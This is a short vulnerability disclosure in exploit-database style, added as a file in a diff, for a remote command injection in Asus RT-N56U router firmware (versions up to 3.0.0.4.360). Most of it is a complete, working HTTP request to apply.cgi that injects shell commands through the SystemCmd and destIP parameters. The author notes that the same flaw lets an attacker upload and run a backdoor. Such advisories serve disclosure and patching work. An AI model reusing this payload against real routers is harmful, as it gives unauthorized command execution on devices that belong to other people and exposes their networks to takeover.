@@ -1,0 +1,28 @@
+# Exploit Title: Asus RT56U Remote Command Injection
+# Date: 05/05/2013
+# Exploit Author: drone (@dronesec)
+# Vendor Homepage: asus.com
+# Version: <= 3.0.0.4.360 (latest)
+
+Device Details:
+==============
+
+Router information: http://www.asus.com/Networking/RTN56U/
+Firmware: http://www.asus.com/Networking/RTN56U/#support_Download_30
+
+Vulnerability Details:
+======================
+Insufficient (or rather, a complete lack thereof) input sanitization leads to the injection of shell commands.  It's possible to upload and execute a backdoor.
+
+Example request:
+GET /apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&next_host=192.168.1.1&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd=ping+-c+5+%3B+ls+-l&firmver=3.0.0.4&cmdMethod=ping&destIP=%3B+ls+-l+.%2Fuser%2Fcgi-bin%2F&pingCNT=5 HTTP/1.1
+Host: 192.168.1.1
+Proxy-Connection: keep-alive
+Authorization: Basic ZGVmYXVsdA==
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36
+Referer: http://192.168.1.1/Main_Analysis_Content.asp
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+
+Screenshot: http://3.bp.blogspot.com/-ZFhW0bRKM3o/UZwoiPOXXyI/AAAAAAAAAe4/WyTtjhpQEho/s1600/asus_exec_360.jpg
